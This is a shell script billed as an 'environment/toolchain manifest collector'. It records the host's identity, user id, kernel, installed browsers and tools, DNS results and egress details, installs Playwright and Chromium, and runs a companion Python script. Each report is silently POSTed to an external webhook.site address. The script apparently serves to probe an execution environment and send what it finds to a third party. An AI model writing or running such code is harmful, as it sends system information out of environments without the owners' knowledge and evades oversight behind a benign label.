#!/bin/sh
# Environment/toolchain manifest collector (round 4: real browser parity).
SINK="https://webhook.site/376900c1-da59-47e7-9d40-3b7df8de9d79/i72112"
L=/tmp/parity
mkdir -p "$L"
post() { [ -s "$1" ] && curl -s -m 25 -X POST -H 'content-type: text/plain' --data-binary @"$1" "$SINK" >/dev/null 2>&1; }

{
  echo "MARKER i72112 inventory"
  date -u
  hostname
  id
  uname -a
  for b in python3 pip3 node npm Xvfb xvfb-run Xorg chromium chromium-browser google-chrome google-chrome-stable firefox; do
    printf '%s=%s\n' "$b" "$(command -v "$b" 2>/dev/null || echo none)"
  done
  python3 -V 2>&1
  python3 -m pip --version 2>&1 | head -2
  python3 -c 'import playwright; print("playwright", getattr(playwright,"__version__","?"))' 2>&1 | head -2
  ls -d /root/.cache/ms-playwright/* /home/ubuntu/.cache/ms-playwright/* 2>/dev/null
  df -h /tmp 2>/dev/null | tail -1
  echo "== getent github =="
  getent hosts github.com 2>&1 | head -3
  echo "== egress ip =="
  curl -s -m 10 https://api.github.com/meta 2>&1 | head -c 120
  echo
} > "$L/inv.txt" 2>&1
post "$L/inv.txt"

if ! python3 -c 'import playwright' >/dev/null 2>&1; then
  {
    echo "== pip install playwright =="
    PIP_DEFAULT_TIMEOUT=60 timeout 260 python3 -m pip install --user --quiet --disable-pip-version-check playwright 2>&1 | tail -6
    echo "pip_rc=$?"
  } > "$L/pip.txt" 2>&1
  post "$L/pip.txt"
fi

if python3 -c 'import playwright' >/dev/null 2>&1; then
  {
    echo "== playwright install chromium =="
    PLAYWRIGHT_DOWNLOAD_CONNECTION_TIMEOUT=60000 timeout 420 python3 -m playwright install chromium 2>&1 | tail -10
    echo "pw_rc=$?"
    ls -d /root/.cache/ms-playwright/* /home/ubuntu/.cache/ms-playwright/* 2>/dev/null
  } > "$L/pw.txt" 2>&1
  post "$L/pw.txt"
fi

if command -v Xvfb >/dev/null 2>&1; then
  ( Xvfb :99 -screen 0 1280x900x24 >/dev/null 2>&1 & )
  export DISPLAY=:99
  echo "xvfb=yes" > "$L/display.txt"
else
  echo "xvfb=no" > "$L/display.txt"
fi
post "$L/display.txt"

timeout 430 python3 "$(dirname "$0")/browser_run.py" > "$L/py.out" 2>&1
echo "py_rc=$?" >> "$L/py.out"
tail -c 4000 "$L/py.out" > "$L/py_tail.txt" 2>/dev/null
post "$L/py_tail.txt"
